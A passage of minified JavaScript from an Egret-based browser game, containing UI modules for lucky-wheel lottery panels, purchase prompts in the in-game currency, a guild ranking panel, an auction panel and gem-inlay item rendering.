this.rightBtn:i=this.menuList.scrollH+e,i=92*Math.round(i/92),i>this.menuList.contentWidth-this.menuScroller.width&&(i=this.menuList.contentWidth-this.menuScroller.width),this.menuList.scrollH=i,this.updateBtn()}},e.prototype.updateData=function(){var t;t=this.config9[this.activityID][0];var e=r.GlobalConfig.ItemConfig[t.item];if(e){this.icon.source=e.icon+"_png";var i=h.BagCT.ins().getBagItemById(e.id),s=0,a=1,l=13746831;i?(s=i.count,l=s>=a?n.ColorUtil.GREEN:n.ColorUtil.RED):l=n.ColorUtil.RED,this.num.textFlow=o.TextFlowMaker.generateTextFlow1("|C:"+l+"&T:"+s+"|C:0xD1C28F&T:/"+a),this.pay0.text=t.yb+""}for(var u in this.config9[this.activityID])if(+u){var p=this.config9[this.activityID][u],i=this["item"+(+u-1)];i.itemIcon.data=p.reward[0],i.rewardState(!1)}this.num2.visible=!1,this.updateProgress(),this.listRefush(),this.setTime()},e.prototype.resultCallBack=function(t){var e;e=f.Activity.ins().activityData[this.activityID],e&&this.activityID==t&&(e.indexs.length>1?win.open(v.LuckyResultWin,this.activityID,e.indexs):1==e.indexs.length&&this.beginLottery(e.indexs[0]),this.listRefush(),this.updateData())},e.prototype.beginLottery=function(t){var e=this,i=1440+36*(t-1),n=egret.Tween.get(this.tttzhi);this.rolling=!0;var o;o=f.Activity.ins(),n.to({rotation:i},4e3,egret.Ease.circOut).call(function(){o.sendReward(e.activityID,1),e.flyItem(e["item"+(t-1)]),setTimeout(function(){e.rolling=!1},2e3)},this)},e.prototype.flyItem=function(t){var e=new a.ItemBase;e.x=t.x,e.y=t.y,e.data=t.itemIcon.data,e.anchorOffsetX=e.width/2,e.anchorOffsetY=e.height/2,t.parent.addChild(e),u.GameLogic.ins().postFlyItemEx(e)},e.prototype.getLottery=function(){if(this.rolling)return void p.TipsCT.ins().showTips(gettext("正在抽奖，请稍候"));if(h.BagCT.ins().getSurplusCount()<h.BagCT.BAG_ENOUGH)return void win.open(c.BagFullTipsWin);var t;t=f.Activity.ins();var e=this.config9[this.activityID][0];if(this.turnten.selected){var i=h.BagCT.ins().getBagGoodsByTypeAndId(h.BagCT.BAG_TYPE_OTHTER,e.item);if(i&&i.count)t.sendReward(this.activityID,2);else{var n=10,o=e.yb*n,s=gettext("是否消耗{0}元宝购买{1}*{2}",o,r.GlobalConfig.ItemConfig[e.item].name,n);d.HuntWarnBuyWin.showBuyWarn("LuckyResultWin"+this.activityID+"-10",this.checkSend10.bind(this),s)}}else{var i=h.BagCT.ins().getBagGoodsByTypeAndId(h.BagCT.BAG_TYPE_OTHTER,e.item);if(i&&i.count)t.sendReward(this.activityID,1);else{var n=1,o=1*e.yb,s=gettext("是否消耗{0}元宝购买{1}*"+n,o,r.GlobalConfig.ItemConfig[e.item].name);d.HuntWarnBuyWin.showBuyWarn("LuckyResultWin"+this.activityID+"-1",this.checkSend1.bind(this),s)}}},e.prototype.checkSend1=function(){var t;t=f.Activity.ins(),t.getRollSum(this.activityID)||l.ActorCC.yb>=this.config9[this.activityID][0].yb?t.sendReward(this.activityID,1):p.TipsCT.ins().showTips(gettext("元宝不足"))},e.prototype.checkSend10=function(){var t;t=f.Activity.ins(),t.getIsRollTen(this.activityID)?t.sendReward(this.activityID,2):p.TipsCT.ins().showTips(gettext("元宝不足"))},e.prototype.updateProgress=function(){var t,e,i=this;e=f.Activity.ins(),t=e.activityData[this.activityID];var n=this.config9[this.activityID][0],o=[];if(n&&t){for(var s=0;s<n.reward.length;s++){var a={index:s,config:n,actType:this.actType};o.push(a)}this.menuListData.replaceAll(o)}this.menuList.validateNow(),egret.callLater(function(){for(var e=0,n=1;n<=i.menuListData.length;n++)if(0==t.getStateByIndex(n)){e=90*(n-1);break}e>i.menuList.contentWidth-i.menuList.width&&(e=i.menuList.contentWidth-i.menuList.width),i.menuList.scrollH=e,i.updateBtn()},this)},e.prototype.updateBtn=function(){this.menuListData.length<=5?this.rightBtn.visible=this.rightRed.visible=this.leftBtn.visible=this.leftRed.visible=!1:this.onChange()},e.prototype.onChange=function(){this.menuList.scrollH<46?(this.leftBtn.visible=this.leftRed.visible=!1,this.rightBtn.visible=this.rightRed.visible=!0):this.menuList.scrollH>=this.menuList.contentWidth-this.menuList.width-46?(this.leftBtn.visible=this.leftRed.visible=!0,this.rightBtn.visible=this.rightRed.visible=!1):(this.leftBtn.visible=this.leftRed.visible=!0,this.rightBtn.visible=this.rightRed.visible=!0),this.updateRedPoint()},e.prototype.updateRedPoint=function(){var t,e=this.config9[this.activityID][0];t=f.Activity.ins();for(var i=!1,n=0;n<e.reward.length&&!(i=t.isGetRollReward(this.activityID,n));n++);this.leftBtn.visible&&(this.leftRed.visible=i),this.rightBtn.visible&&(this.rightRed.visible=i)},e.prototype.listRefush=function(){var t,e;if(t=f.Activity.ins(),e=t.activityData[this.activityID]){for(var i=[],n=0;n<e.noticeArr.length;n++){var o={activityID:this.activityID,name:e.noticeArr[n].name,index:e.noticeArr[n].itemId,actType:this.actType};i.push(o)}this.list.dataProvider=new eui.ArrayCollection(i)}},e.prototype.setTime=function(){var t,e;t=f.Activity.ins(),e=t.activityData[this.activityID],e&&(this.actTime.text=gettext("剩余时间：{0}",e.getRemainTime()))},__decorate([delayCall(100)],e.prototype,"updateData",null),e}(s.BaseView);e.OSATarget9Panel3=C,window.OSATarget9Panel3=C,__reflect(C.prototype,"OSATarget9Panel3",[]),window.OSATarget9Panel3=C},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.OSATarget9Panel4=void 0;var n=i(18),o=i(5),s=i(1),a=i(11),r=i(0),l=i(4),h=i(6),u=i(23),p=i(2),d=i(111),c=i(175),f=i(9),g=i(29),m=i(177),v=i(144),y=i(272),C=function(t){function e(){var e=t.call(this)||this;return e.huntType=1,e.skinName="luckyTurntableSkin",e}return __extends(e,t),e.prototype.close=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.menuScroller.removeEventListener(egret.TouchEvent.TOUCH_TAP,this.onChange,this),this.removeObserve(),egret.Tween.removeTweens(this.tttzhi),this.rolling=!1;var i;i=this.ins.activityData[this.activityID],i&&1==i.indexs.length&&this.ins.sendReward(this.activityID,1),Timer.stopAll(this)},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.actType=g.ActivityPanel.getActivityTypeFromId(this.activityID),this.ins=f.Activity.ins(),this.config9=r.GlobalConfig.ActivityType9Config,this.observe(this.ins.postChangePage,this.resultCallBack),this.addEvent(eui.UIEvent.CHANGE_END,this.menuScroller,this.onChange),this.addTouchEvent(this.rightBtn,this.onTouch),this.addTouchEvent(this.leftBtn,this.onTouch),Timer.start(1e3,0,this.setTime,this),this.addTouchEvent(this.choujiangBtn,this.getLottery),this.list.itemRenderer=m.NoticeListRenderer,this.menuList.itemRenderer=y.OSATarget9Panel3ItemRender,this.menuListData=new eui.ArrayCollection,this.menuList.dataProvider=this.menuListData,this.turnten.selected=!1,this.currentState="resetWithKey",this.validateNow(),this.updateData()},e.prototype.onTouch=function(t){var e=460,i=0;switch(t.currentTarget){case this.leftBtn:i=this.menuList.scrollH-e,i=92*Math.round(i/92),0>i&&(i=0),this.menuList.scrollH=i,this.updateBtn();break;case this.rightBtn:i=this.menuList.scrollH+e,i=92*Math.round(i/92),i>this.menuList.contentWidth-this.menuScroller.width&&(i=this.menuList.contentWidth-this.menuScroller.width),this.menuList.scrollH=i,this.updateBtn()}},e.prototype.updateData=function(){var t=this.config9[this.activityID][0],e=r.GlobalConfig.ItemConfig[t.item];if(e){this.icon.source=e.icon+"_png";var i=h.BagCT.ins().getBagItemById(e.id),s=0,a=1,l=13746831;i?(s=i.count,l=s>=a?n.ColorUtil.GREEN:n.ColorUtil.RED):l=n.ColorUtil.RED,this.num.textFlow=o.TextFlowMaker.generateTextFlow1("|C:"+l+"&T:"+s+"|C:0xD1C28F&T:/"+a),this.pay0.text=t.yb+""
}for(var u in this.config9[this.activityID])if(+u){var p=this.config9[this.activityID][u],i=this["item"+(+u-1)];i.itemIcon.data=p.reward[0],i.rewardState(!1)}this.num2.visible=!1,this.updateProgress(),this.listRefush(),this.setTime()},e.prototype.resultCallBack=function(t){var e;e=this.ins.activityData[this.activityID],e&&this.activityID==t&&(e.indexs.length>1?win.open(v.LuckyResultWin,this.activityID,e.indexs):1==e.indexs.length&&this.beginLottery(e.indexs[0]),this.listRefush(),this.updateData())},e.prototype.beginLottery=function(t){var e=this,i=1440+36*(t-1),n=egret.Tween.get(this.tttzhi);this.rolling=!0,n.to({rotation:i},4e3,egret.Ease.circOut).call(function(){e.ins.sendReward(e.activityID,1),e.flyItem(e["item"+(t-1)]),setTimeout(function(){e.rolling=!1},2e3)},this)},e.prototype.flyItem=function(t){var e=new a.ItemBase;e.x=t.x,e.y=t.y,e.data=t.itemIcon.data,e.anchorOffsetX=e.width/2,e.anchorOffsetY=e.height/2,t.parent.addChild(e),u.GameLogic.ins().postFlyItemEx(e)},e.prototype.getLottery=function(){if(this.rolling)return void p.TipsCT.ins().showTips(gettext("正在抽奖，请稍候"));if(h.BagCT.ins().getSurplusCount()<h.BagCT.BAG_ENOUGH)return void win.open(c.BagFullTipsWin);this.huntType=this.turnten.selected?2:1;var t=this.config9[this.activityID][0],e=h.BagCT.ins().getBagGoodsByTypeAndId(h.BagCT.BAG_TYPE_OTHTER,t.item);if(e&&e.count)this.ins.sendReward(this.activityID,this.huntType);else{var i=2==this.huntType?10:1,n=gettext("是否消耗{0}元宝购买{1}*{2}",t.yb*i,r.GlobalConfig.ItemConfig[t.item].name,i);d.HuntWarnBuyWin.showBuyWarn("LuckyResultWin"+this.activityID+(10==i?"-10":"-1"),this.huntWarnFun.bind(this),n)}},e.prototype.huntWarnFun=function(){var t=this.config9[this.activityID][0],e=2==this.huntType?10:1;l.ActorCC.yb>=t.yb*e?this.ins.sendReward(this.activityID,this.huntType):p.TipsCT.ins().showTips(gettext("|C:{0}&T:元宝不足|",15937822))},e.prototype.updateProgress=function(){var t,e=this,i=this.config9[this.activityID][0];t=this.ins.activityData[this.activityID];var n=[];if(i&&t){for(var o=0;o<i.reward.length;o++){var s={index:o,config:i,actType:this.actType};n.push(s)}this.menuListData.replaceAll(n)}this.menuList.validateNow(),egret.callLater(function(){for(var i=0,n=1;n<=e.menuListData.length;n++)if(0==t.getStateByIndex(n)){i=90*(n-1);break}i>e.menuList.contentWidth-e.menuList.width&&(i=e.menuList.contentWidth-e.menuList.width),e.menuList.scrollH=i,e.updateBtn()},this)},e.prototype.updateBtn=function(){this.menuListData.length<=5?this.rightBtn.visible=this.rightRed.visible=this.leftBtn.visible=this.leftRed.visible=!1:this.onChange()},e.prototype.onChange=function(){this.menuList.scrollH<46?(this.leftBtn.visible=this.leftRed.visible=!1,this.rightBtn.visible=this.rightRed.visible=!0):this.menuList.scrollH>=this.menuList.contentWidth-this.menuList.width-46?(this.leftBtn.visible=this.leftRed.visible=!0,this.rightBtn.visible=this.rightRed.visible=!1):(this.leftBtn.visible=this.leftRed.visible=!0,this.rightBtn.visible=this.rightRed.visible=!0),this.updateRedPoint()},e.prototype.updateRedPoint=function(){for(var t=this.config9[this.activityID][0],e=!1,i=0;i<t.reward.length&&!(e=this.ins.isGetRollReward(this.activityID,i));i++);this.leftBtn.visible&&(this.leftRed.visible=e),this.rightBtn.visible&&(this.rightRed.visible=e)},e.prototype.listRefush=function(){var t;if(t=this.ins.activityData[this.activityID]){for(var e=[],i=0;i<t.noticeArr.length;i++){var n={activityID:this.activityID,name:t.noticeArr[i].name,index:t.noticeArr[i].itemId,actType:this.actType};e.push(n)}this.list.dataProvider=new eui.ArrayCollection(e)}},e.prototype.setTime=function(){var t;t=this.ins.activityData[this.activityID],t&&(this.actTime.text=gettext("剩余时间：{0}",t.getRemainTime()))},__decorate([delayCall(100)],e.prototype,"updateData",null),e}(s.BaseView);e.OSATarget9Panel4=C,window.OSATarget9Panel4=C,__reflect(C.prototype,"OSATarget9Panel4",[]),window.OSATarget9Panel4=C},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.OSATarget9Panel5=void 0;var n=i(18),o=i(5),s=i(1),a=i(11),r=i(0),l=i(4),h=i(6),u=i(23),p=i(2),d=i(111),c=i(175),f=i(9),g=i(33),m=i(29),v=i(177),y=i(144),C=function(t){function e(){return t.call(this)||this}return __extends(e,t),e.prototype.setCurSkin=function(){var t;t=r.GlobalConfig.ActivityConfig[this.activityID],t.pageSkin?this.skinName=t.pageSkin:this.skinName="XNluckyTurntableSkin"},e.prototype.close=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.removeObserve(),egret.Tween.removeTweens(this.tttzhi),this.rolling=!1;var i;this.actType==g.ActivityType.Normal&&(i=this.ins.activityData[this.activityID]),i&&1==i.indexs.length&&this.ins.sendReward(this.activityID,1),Timer.stopAll(this)},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.actType=m.ActivityPanel.getActivityTypeFromId(this.activityID),this.setCurSkin(),this.actType==g.ActivityType.Normal&&(this.ins=f.Activity.ins(),this.config9=r.GlobalConfig.ActivityType9Config),this.observe(this.ins.postChangePage,this.resultCallBack),Timer.start(1e3,0,this.setTime,this),this.addTouchEvent(this.choujiangBtn,this.getLottery),this.list.itemRenderer=v.NoticeListRenderer,this.turnten.selected=!1,this.currentState="resetWithKey",this.validateNow(),this.updateData()},e.prototype.onTouch=function(t){t.currentTarget},e.prototype.updateData=function(){var t=this.config9[this.activityID][0],e=r.GlobalConfig.ItemConfig[t.item];if(e){this.icon.source=e.icon+"_png";var i=h.BagCT.ins().getBagItemById(e.id),s=0,a=1,l=13746831;i?(s=i.count,l=s>=a?n.ColorUtil.GREEN:n.ColorUtil.RED):l=n.ColorUtil.RED,this.num.textFlow=o.TextFlowMaker.generateTextFlow1("|C:"+l+"&T:"+s+"|C:0xD1C28F&T:/"+a),this.pay0.text=t.yb+""}for(var u in this.config9[this.activityID])if(+u){var p=this.config9[this.activityID][u],i=this["item"+(+u-1)];i.itemIcon.data=p.reward[0],i.rewardState(!1)}this.num2.visible=!1,this.listRefush(),this.setTime()},e.prototype.resultCallBack=function(t){var e;this.actType==g.ActivityType.Normal&&(e=this.ins.activityData[this.activityID]),e&&this.activityID==t&&(e.indexs.length>1?win.open(y.LuckyResultWin,this.activityID,e.indexs):1==e.indexs.length&&this.beginLottery(e.indexs[0]),this.listRefush(),this.updateData())},e.prototype.beginLottery=function(t){var e=this,i=1440+36*(t-1),n=egret.Tween.get(this.tttzhi);this.rolling=!0,n.to({rotation:i},4e3,egret.Ease.circOut).call(function(){e.ins.sendReward(e.activityID,1),e.flyItem(e["item"+(t-1)]),setTimeout(function(){e.rolling=!1},2e3)},this)},e.prototype.flyItem=function(t){var e=new a.ItemBase;e.x=t.x,e.y=t.y,e.data=t.itemIcon.data,e.anchorOffsetX=e.width/2,e.anchorOffsetY=e.height/2,t.parent.addChild(e),u.GameLogic.ins().postFlyItemEx(e)},e.prototype.getLottery=function(){if(this.rolling)return void p.TipsCT.ins().showTips(gettext("正在抽奖，请稍候"));if(h.BagCT.ins().getSurplusCount()<h.BagCT.BAG_ENOUGH)return void win.open(c.BagFullTipsWin);var t=this.config9[this.activityID][0];if(this.turnten.selected){var e=h.BagCT.ins().getBagGoodsByTypeAndId(h.BagCT.BAG_TYPE_OTHTER,t.item);if(e&&e.count)this.ins.sendReward(this.activityID,2);else{var i=10,n=t.yb*i,o=gettext("是否消耗{0}元宝购买{1}*{2}",n,r.GlobalConfig.ItemConfig[t.item].name,i);d.HuntWarnBuyWin.showBuyWarn("LuckyResultWin"+this.activityID+"-10",this.checkSend10.bind(this),o)}}else{var e=h.BagCT.ins().getBagGoodsByTypeAndId(h.BagCT.BAG_TYPE_OTHTER,t.item);if(e&&e.count)this.ins.sendReward(this.activityID,1);else{var i=1,n=1*t.yb,o=gettext("是否消耗{0}元宝购买{1}*{2}",n,r.GlobalConfig.ItemConfig[t.item].name,i);d.HuntWarnBuyWin.showBuyWarn("LuckyResultWin"+this.activityID+"-1",this.checkSend1.bind(this),o)}}},e.prototype.checkSend10=function(){this.ins.getIsRollTen(this.activityID)?this.ins.sendReward(this.activityID,2):p.TipsCT.ins().showTips(gettext("元宝不足"))},e.prototype.checkSend1=function(){this.ins.getRollSum(this.activityID)||l.ActorCC.yb>=this.config9[this.activityID][0].yb?this.ins.sendReward(this.activityID,1):p.TipsCT.ins().showTips(gettext("元宝不足"))},e.prototype.updateRedPoint=function(){for(var t=this.config9[this.activityID][0],e=!1,i=0;i<t.reward.length&&!(e=this.ins.isGetRollReward(this.activityID,i));i++);},e.prototype.listRefush=function(){var t;if(t=this.ins.activityData[this.activityID]){for(var e=[],i=0;i<t.noticeArr.length;i++){var n={activityID:this.activityID,name:t.noticeArr[i].name,index:t.noticeArr[i].itemId,actType:this.actType};e.push(n)}this.list.dataProvider=new eui.ArrayCollection(e)}},e.prototype.setTime=function(){var t;t=this.ins.activityData[this.activityID],t&&(this.actTime.text=gettext("剩余时间：{0}",t.getRemainTime()))},__decorate([delayCall(100)],e.prototype,"updateData",null),e}(s.BaseView);e.OSATarget9Panel5=C,window.OSATarget9Panel5=C,__reflect(C.prototype,"OSATarget9Panel5",[]),window.OSATarget9Panel5=C},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.OSATarget9Panel6=void 0;var n=i(21),o=i(18),s=i(5),a=i(1),r=i(0),l=i(6),h=i(2),u=i(9),p=i(29),d=i(144),c=i(588),f=function(t){function e(){var e=t.call(this)||this;return e.itemList=[],e.latterTime=100,e.currentState="common",e.hasInit=!0,e.mcUp=new n.MovieClip,e.mcUp.playFile(RES_DIR_EFF+"TurnEff_1",-1),e.mcDown=new n.MovieClip,e.mcDown.playFile(RES_DIR_EFF+"TurnEff_2",-1),e}return __extends(e,t),e.prototype.setCurSkin=function(){var t;t=r.GlobalConfig.ActivityConfig[this.activityID],t.pageSkin?this.skinName=t.pageSkin:this.skinName="CDRXZhuanpanSkin",this.listDP=new eui.ArrayCollection,this.eList.itemRenderer=c.OSATarget9ItemRender6,this.eList.dataProvider=this.listDP,this.sDesc=t.desc,this.eUpGroup.addChild(this.mcUp),this.eDownGroup.addChild(this.mcDown)},e.prototype.close=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.removeObserve(),egret.Tween.removeTweens(this.tttzhi),this.rolling=!1,this.actData&&1==this.actData.indexs.length&&this.ins.sendReward(this.activityID,1),Timer.stopAll(this)},e.prototype.skinComplete=function(){this.actType=p.ActivityPanel.getActivityTypeFromId(this.activityID),this.setCurSkin(),this.ins=u.Activity.ins(),this.config9=r.GlobalConfig.ActivityType9Config},e.prototype.addDisplay=function(){observe(this,this.resultCallBack,this.ins.postChangePage),Timer.has(this.setTime,this)||Timer.start(1e3,0,this.setTime,this),this.addTouchEvent(this,this.onClick),this.hasInit?(this.hasInit=!1,this.autoChangeState()):this.updateData()},e.prototype.autoChangeState=function(){this.actData=this.ins.activityData[this.activityID],this.actData&&((this.actData.count+1)%5==0?"thunder"!=this.currentState&&this.changeState():"thunder"==this.currentState?this.changeState():this.updateData())},e.prototype.changeState=function(){this.rolling||("thunder"==this.currentState?this.currentState="common":this.currentState="thunder",this.updateData())},e.prototype.updateData=function(){var t=this,e=this.config9[this.activityID][0],i=r.GlobalConfig.ItemConfig[e.item];if(i){this.icon.source=i.icon+"_png";var n=l.BagCT.ins().getBagItemById(i.id),a=0,h=1,u=13746831;n?(a=n.count,u=a>=h?o.ColorUtil.GREEN:o.ColorUtil.RED):u=o.ColorUtil.RED,this.num.textFlow=s.TextFlowMaker.generateTextFlow1("|C:"+u+"&T:"+a+"|C:0xD1C28F&T:/"+h)}this.sTips=(this.actData.count+1)%5==0?gettext("已开启豪华传奇转盘"):gettext("再转{0}次即可开启传奇转盘",5-(this.actData.count+1)%5);var p=function(e){return+e?void setTimeout(function(){var i=t.config9[t.activityID][e],n=t["item"+(+e-1)];n&&i&&(n.itemIcon&&(n.itemIcon.data="thunder"==t.currentState?i.sReward[0]:i.reward[0]),n.rewardState(!1)),t.latterTime=0},d.latterTime):"continue"},d=this;for(var c in this.config9[this.activityID])p(c);if(this.desc){var f=r.GlobalConfig.ActivityBtnConfig[this.activityID];f&&(this.desc.source=f.bgImg||"")}this.updateProgress(),this.setTime()},e.prototype.resultCallBack=function(t){this.actData=this.ins.activityData[this.activityID],this.actData&&this.activityID==t&&(this.actData.indexs.length>1?win.open(d.LuckyResultWin,this.activityID,this.actData.indexs):1==this.actData.indexs.length&&this.beginLottery(this.actData.indexs[0]),this.updateData())},e.prototype.beginLottery=function(t){var e=this,i=1440+36*(t-1);this.rolling||(this.rolling=!0);var n=function(){e.ins.sendReward(e.activityID,1),e.flyItem(e["item"+(t-1)]),setTimeout(function(){e.rolling=!1,e.autoChangeState()},1e3)};if(this.eCD&&this.eCD.selected)this.tttzhi.rotation=i,n();else{var o=egret.Tween.get(this.tttzhi);o.to({rotation:i},4e3,egret.Ease.circOut).call(function(){n()},this)}},e.prototype.flyItem=function(t){},e.prototype.getLottery=function(){if(urlParam.appid){var t=r.GlobalConfig.ActivityConfig[this.activityID];if(t&&t.onlyappid){var e=!1;for(var i in t.onlyappid)urlParam.appid==t.onlyappid[i]&&(e=!0);if(!e)return void(t.onlyappidTip?h.TipsCT.ins().showTips(t.onlyappidTip):h.TipsCT.ins().showTips(gettext("|C:0xf3311e&T:关注公众号转端获得奖励|")))}}if(this.rolling)return void h.TipsCT.ins().showTips(gettext("正在抽奖，请稍候"));if(this.autoChangeState(),l.BagCT.ins().getSurplusCount()<l.BagCT.BAG_ENOUGH)return void win.open("BagFullTipsWin");var n=this.config9[this.activityID][0],o=l.BagCT.ins().getBagGoodsByTypeAndId(l.BagCT.BAG_TYPE_OTHTER,n.item);o&&o.count?(this.ins.sendReward(this.activityID,1),this.rolling||(this.rolling=!0)):h.TipsCT.ins().showTips(gettext("道具不足"))},e.prototype.updateProgress=function(){var t,e;t=r.GlobalConfig.ActivityType9Config[this.activityID],e=u.Activity.ins().activityData[this.activityID];var i=t[0];if(i&&e){this.eScore.text=this.actData.count+"";var n=[];for(var o in i.reward)n.push([i.reward[o],e,+o+1]);this.listDP.source=n}},e.prototype.onClick=function(t){if(t.target instanceof c.OSATarget9ItemRender6){var e=t.target.getIndex();if(e>0){if(this.rolling)return void h.TipsCT.ins().showTips(gettext("正在抽奖，请稍候"));this.ins.sendReward(this.activityID,0,e)}}else switch(t.target){case this.choujiangBtn:this.getLottery();break;case this.thu:this.changeState()}},e.prototype.setTime=function(){this.actData&&(this.sTime=gettext("剩余时间：{0}",this.actData.getRemainTime()))},e}(a.BaseView);e.OSATarget9Panel6=f,window.OSATarget9Panel6=f,__reflect(f.prototype,"OSATarget9Panel6",[]),window.OSATarget9Panel6=f},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.Osa59pInfoPanel=void 0;var n=i(1),o=i(11),s=i(9),a=i(0),r=i(574),l=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="osa59pinfoskin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.eItem.itemRenderer=o.ItemBase,this.eList.itemRenderer=r.OSATarget59Item,this._titleMc||(this._titleMc=ObjectPool.pop("MovieClip"),this.effGrp.addChild(this._titleMc))},e.prototype.addDisplay=function(){this.setData(this.actId,this.no,this.state)},e.prototype.setData=function(t,e,i){if(this.actId=t,this.no=e,this.state=i,this.skin&&t){this.eNo.source="paihang_d"+e;var n="";n=1==e?"hanghui_json.dikuang3":"hanghui_json.dikuang2",this.imgBg.source=n;var o=s.Activity.ins().activityData[t];if(o){var r=o.guildData[e-1];this.eGuild.text=r&&r.name?r.name:"",this.ePower.text=r?r.power+"":"0";var l=a.GlobalConfig.ActivityType59Config[t];this._titleMc.playFile(RES_DIR_EFF+l[1][e][0].eff,-1),this.eItem.dataProvider=new eui.ArrayCollection(l[1][e][0].reward);var h=[];for(var u in l[2][e])h.push({cfg:l[2][e][u],player:r&&r.member[+u-1]?r.member[+u-1]:""});this.eList.dataProvider=new eui.ArrayCollection(h)}}},e}(n.BaseView);e.Osa59pInfoPanel=l,window.Osa59pInfoPanel=l,__reflect(l.prototype,"Osa59pInfoPanel",[]),window.Osa59pInfoPanel=l},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.ShowChanceWin=void 0;var n=i(5),o=i(1),s=function(t){function e(){var e=t.call(this)||this;return e._sn_="CDGoodluckTurntableTipsSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.addTouchEvent(this,this.onClick)},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.eLab.textFlow=n.TextFlowMaker.generateTextFlow(t[0]?t[0]:"")},e.prototype.onClick=function(t){switch(t.target){case this.eClose:win.close(this)}},e}(o.BaseView);e.ShowChanceWin=s,window.ShowChanceWin=s,__reflect(s.prototype,"ShowChanceWin",[]),window.ShowChanceWin=s},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.XiaoNianItem=void 0;var n=i(3),o=function(t){function e(){var e=t.call(this)||this;return e._sn_="XNHongBaoItem",e}return __extends(e,t),e.prototype.childrenCreated=function(){t.prototype.childrenCreated.call(this)},e.prototype.dataChanged=function(){this.data&&(this.currentState=this.data)},e.prototype.destruct=function(){},e}(n.BaseItemRender);e.XiaoNianItem=o,window.XiaoNianItem=o,__reflect(o.prototype,"XiaoNianItem",[]),window.XiaoNianItem=o},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.Act62BigRewardItem=void 0;var n=i(11),o=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._select=!1,e}return __extends(e,t),e.prototype.dataChanged=function(){this.data?(this._select=!0,this.currentState="node"):(this._select=!1,this.currentState="choice"),t.prototype.dataChanged.call(this)},Object.defineProperty(e.prototype,"isSelect",{get:function(){return this._select},enumerable:!1,configurable:!0}),e}(n.ItemBase);e.Act62BigRewardItem=o,window.Act62BigRewardItem=o,__reflect(o.prototype,"Act62BigRewardItem",[]),window.Act62BigRewardItem=o},function(t,e){},function(t,e){},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.AuctionPanel=void 0;var n=i(1),o=i(130),s=i(589),a=i(244),r=i(4),l=i(36),h=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="auctionPanelSkin",e.type=0,e}return __extends(e,t),e.prototype.skinComplete=function(){},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.addTouchEndEvent(this,this.onTouch),observe(this,this.update,o.Auction.ins().postListData),observe(this,this.update,o.Auction.ins().postAuctionResult),observe(this,this.update,o.Auction.ins().postBuyResult),observe(this,this.update,o.Auction.ins().postUpdate),observe(this,this.update,o.Auction.ins().postChangeView),this.list.itemRenderer=s.AuctionItemRender,this.list.dataProvider=this.collect=new eui.ArrayCollection([]),this.update(),Timer.stopAll(this),Timer.start(1e4,0,this.onSend,this)},e.prototype.onSend=function(){o.Auction.ins().sendGetList(this.type)},e.prototype.update=function(){this.type=a.AuctionWin.Page_Type,this.updateCurPage()},e.prototype.onTouch=function(t){switch(t.target){case this.btn:win.open("AuctionRecordWin",this.type);break;case this.btnGainGoods:var e=win.open("ShopGoodsWarn");e.setData(l.MoneyConst.guildGx,1)}},e.prototype.updateCurPage=function(){var t=o.Auction.ins().getDataByPage(this.type)||[],e=this.collect.source;if(e&&e.length==(t?t.length:0))for(var i=e.length,n=0;i>n;n++){e[n]=t[n];var s=this.list.getElementAt(n);s&&this.list.updateRenderer(s,n,t[n])}else this.collect.source=t;this.lab1.visible=t.length<=0,this.itemScroller.visible=!this.lab1.visible,this.lab.text=""+r.ActorCC.guildNum},e}(n.BaseView);e.AuctionPanel=h,window.AuctionPanel=h,__reflect(h.prototype,"AuctionPanel",[]),window.AuctionPanel=h},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.EquipInlayGemItemItem=void 0;var n=i(5),o=i(3),s=i(0),a=i(57),r=i(31),l=i(590),h=i(208),u=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="equipGemItemSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){},e.prototype.dataChanged=function(){var t,e;if(this.data){this.gemItem.data=this.data,this.gemItem.touchEnabled=!1,this.gemItem.touchChildren=!1;var i=this.data.statue,o="";o=i==a.GEM_STATUS.UnLOCK?gettext("未打孔"):i==a.GEM_STATUS.UnInlaid?gettext("未镶嵌"):(null===(t=this.data.itemData)||void 0===t?void 0:t.getGemSkillDes())||"";var u="",p=this.data.getPfId();if(p){var d=s.GlobalConfig.GemPrefixConfig[p].body,c=new h.EquipInlaySuitData(d);c.roleData=l.EquipDetailedItem.rankRole(),void 0!=c.suitName&&(u=c.suitName)}var f=(null===(e=this.data.itemData)||void 0===e?void 0:e.getGemLv())||0;0!=f&&(this.lbDes.textColor=r.QUALITY_COLOR[f||0]),this.lbDes.textFlow=n.TextFlowMaker.generateTextFlow1(u+o)}},e}(o.BaseItemRender);e.EquipInlayGemItemItem=u,window.EquipInlayGemItemItem=u,__reflect(u.prototype,"EquipInlayGemItemItem",[]),window.EquipInlayGemItemItem=u},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.BossRewardsItem=void 0;var 